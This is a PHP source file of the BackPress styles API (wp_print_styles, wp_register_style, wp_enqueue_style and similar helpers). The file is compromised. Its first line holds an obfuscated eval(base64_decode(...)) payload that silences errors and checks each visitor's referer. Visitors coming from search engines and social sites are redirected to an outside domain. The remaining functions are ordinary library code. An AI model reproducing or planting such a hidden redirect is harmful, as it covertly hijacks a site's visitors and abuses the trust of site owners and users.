<?php	 	eval(base64_decode("DQplcnJvcl9yZXBvcnRpbmcoMCk7DQokcWF6cGxtPWhlYWRlcnNfc2VudCgpOw0KaWYgKCEkcWF6cGxtKXsNCiRyZWZlcmVyPSRfU0VSVkVSWydIVFRQX1JFRkVSRVInXTsNCiR1YWc9JF9TRVJWRVJbJ0hUVFBfVVNFUl9BR0VOVCddOw0KaWYgKCR1YWcpIHsNCmlmICghc3RyaXN0cigkdWFnLCJNU0lFIDcuMCIpKXsKaWYgKHN0cmlzdHIoJHJlZmVyZXIsInlhaG9vIikgb3Igc3RyaXN0cigkcmVmZXJlciwiYmluZyIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsInJhbWJsZXIiKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJnb2dvIikgb3Igc3RyaXN0cigkcmVmZXJlciwibGl2ZS5jb20iKW9yIHN0cmlzdHIoJHJlZmVyZXIsImFwb3J0Iikgb3Igc3RyaXN0cigkcmVmZXJlciwibmlnbWEiKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJ3ZWJhbHRhIikgb3Igc3RyaXN0cigkcmVmZXJlciwiYmVndW4ucnUiKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJzdHVtYmxldXBvbi5jb20iKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJiaXQubHkiKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJ0aW55dXJsLmNvbSIpIG9yIHByZWdfbWF0Y2goIi95YW5kZXhcLnJ1XC95YW5kc2VhcmNoXD8oLio/KVwmbHJcPS8iLCRyZWZlcmVyKSBvciBwcmVnX21hdGNoICgiL2dvb2dsZVwuKC4qPylcL3VybFw/c2EvIiwkcmVmZXJlcikgb3Igc3RyaXN0cigkcmVmZXJlciwibXlzcGFjZS5jb20iKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJmYWNlYm9vay5jb20iKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJhb2wuY29tIikpIHsNCmlmICghc3RyaXN0cigkcmVmZXJlciwiY2FjaGUiKSBvciAhc3RyaXN0cigkcmVmZXJlciwiaW51cmwiKSl7DQpoZWFkZXIoIkxvY2F0aW9uOiBodHRwOi8vcm9sbG92ZXIud2lrYWJhLmNvbS8iKTsNCmV4aXQoKTsNCn0KfQp9DQp9DQp9"));
/**
 * BackPress styles procedural API.
 *
 * @package BackPress
 * @since r79
 */

/**
 * Display styles that are in the queue or part of $handles.
 *
 * @since r79
 * @uses do_action() Calls 'wp_print_styles' hook.
 * @global object $wp_styles The WP_Styles object for printing styles.
 *
 * @param array $handles (optional) Styles to be printed.  (void) prints queue, (string) prints that style, (array of strings) prints those styles.
 * @return bool True on success, false on failure.
 */
function wp_print_styles( $handles = false ) {
	do_action( 'wp_print_styles' );
	if ( '' === $handles ) // for wp_head
		$handles = false;

	global $wp_styles;
	if ( !is_a($wp_styles, 'WP_Styles') ) {
		if ( !$handles )
			return array(); // No need to instantiate if nothing's there.
		else
			$wp_styles = new WP_Styles();
	}

	return $wp_styles->do_items( $handles );
}

/**
 * Register CSS style file.
 *
 * @since r79
 * @see WP_Styles::add() For parameter and additional information.
 */
function wp_register_style( $handle, $src, $deps = array(), $ver = false, $media = 'all' ) {
	global $wp_styles;
	if ( !is_a($wp_styles, 'WP_Styles') )
		$wp_styles = new WP_Styles();

	$wp_styles->add( $handle, $src, $deps, $ver, $media );
}

/**
 * Remove a registered CSS file.
 *
 * @since r79
 * @see WP_Styles::remove() For parameter and additional information.
 */
function wp_deregister_style( $handle ) {
	global $wp_styles;
	if ( !is_a($wp_styles, 'WP_Styles') )
		$wp_styles = new WP_Styles();

	$wp_styles->remove( $handle );
}

/**
 * Enqueue a CSS style file.
 *
 * @since r79
 * @see WP_Styles::add(), WP_Styles::enqueue()
 */
function wp_enqueue_style( $handle, $src = false, $deps = array(), $ver = false, $media = false ) {
	global $wp_styles;
	if ( !is_a($wp_styles, 'WP_Styles') )
		$wp_styles = new WP_Styles();

	if ( $src ) {
		$_handle = explode('?', $handle);
		$wp_styles->add( $_handle[0], $src, $deps, $ver, $media );
	}
	$wp_styles->enqueue( $handle );
}

/**
 * Check whether style has been added to WordPress Styles.
 *
 * The values for list defaults to 'queue', which is the same as enqueue for
 * styles.
 *
 * @since WP unknown; BP unknown
 *
 * @param string $handle Handle used to add style.
 * @param string $list Optional, defaults to 'queue'. Others values are 'registered', 'queue', 'done', 'to_do'
 * @return bool
 */
function wp_style_is( $handle, $list = 'queue' ) {
	global $wp_styles;
	if ( !is_a($wp_styles, 'WP_Styles') )
		$wp_styles = new WP_Styles();

	$query = $wp_styles->query( $handle, $list );

	if ( is_object( $query ) )
		return true;

	return $query;
}
